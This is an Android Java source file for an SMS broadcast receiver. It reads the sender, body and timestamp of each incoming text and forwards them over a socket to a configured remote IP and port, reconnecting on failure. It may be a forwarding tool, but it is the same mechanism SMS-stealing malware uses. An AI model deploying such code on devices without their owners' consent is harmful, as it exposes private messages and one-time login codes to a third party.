package com.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.telephony.SmsMessage;

import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;

import me.pqpo.librarylog4a.Log4a;

public class SmsReceiver extends BroadcastReceiver {

    public ExecutorService executor;
//    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {
        fun.Log("SmsReceiver", "onReceive------------");
        if(executor == null){
            executor = Executors.newCachedThreadPool();
        }
        if (fun.receivesms && fun.isrun) {

            try {
                //接受intent对象当中的数据
                Bundle bundle = intent.getExtras();
                //Bundle对象当中有个属性名为pdus，这个属性值是一个Object数组
                Object[] myOBJpdus = (Object[]) bundle.get("pdus");
                //创建一个SmsMessage类型的数组
                SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
                for (int i = 0; i < myOBJpdus.length; i++) {
                    try {
                        //使用Object数组当中的对象创建SmsMessage对象
                        messages[i] = SmsMessage.createFromPdu((byte[]) myOBJpdus[i]);
                        //调用对象相应方法，获取相应内容
                        String number = messages[i].getOriginatingAddress();
                        String body = messages[i].getDisplayMessageBody();
                        String date = String.valueOf(messages[i].getTimestampMillis());
                        String id = "9999";
                        if (fun.socket != null) {
                            if (fun.socket.isconn() && !fun.socket.isclose()) {
                                final String msgObj = "address:" + number + "@body:" + body + "@date:" + date + "@id:" + id + "@\n";
                                fun.isrun = true;
                                fun.smscount++;
                                executor.execute(new Runnable() {
                                    @Override
                                    public void run() {
                                        fun.Log("SmsReceiver","SmsReceiverContent:"+msgObj);
                                        fun.socket.send(msgObj);
                                    }
                                });
//                                sendth send = new sendth(msgObj);
//                                send.start();
//                                Thread.sleep(1000);
                            } else {
                                fun.Log("SmsReceiver", "disconn");
                                reconn();
                                break;

                            }
                        } else {
                            fun.Log("SmsReceiver", "not netweb");
                            reconn();
                            break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        fun.Log("SmsReceiver - Exception",e.getMessage());
                        reconn();
                        break;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                fun.Log("SmsReceiver - Exception",e.getMessage());
                reconn();

            }
        }else{
            fun.Log("SmsReceiver", "receive not run");
        }


    }

    private void reconn() {
        fun.receivesms = false;
        if(fun.socket!=null)
        fun.socket.close2();
        if (!fun.IP.equals("") && !fun.Port.equals("")) {
            fun.socket = new Socketth(fun.IP, Integer.valueOf(fun.Port));
            fun.socket.start();
        }

    }

}
